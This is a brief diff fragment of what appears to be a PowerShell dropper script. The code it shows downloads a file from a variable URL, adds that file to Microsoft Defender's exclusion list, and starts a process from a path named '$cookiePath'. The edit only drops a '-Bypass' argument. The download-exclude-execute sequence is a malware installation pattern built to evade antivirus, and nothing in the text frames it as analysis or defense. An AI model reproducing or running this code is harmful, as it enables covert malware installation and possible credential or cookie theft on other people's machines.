@@ -18,5 +18,5 @@ Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
 
 
 Add-MpPreference -ExclusionProcess $getfilePath
-Start-Process -FilePath $cookiePath -ArgumentList "-Bypass"
+Start-Process -FilePath $cookiePath
 
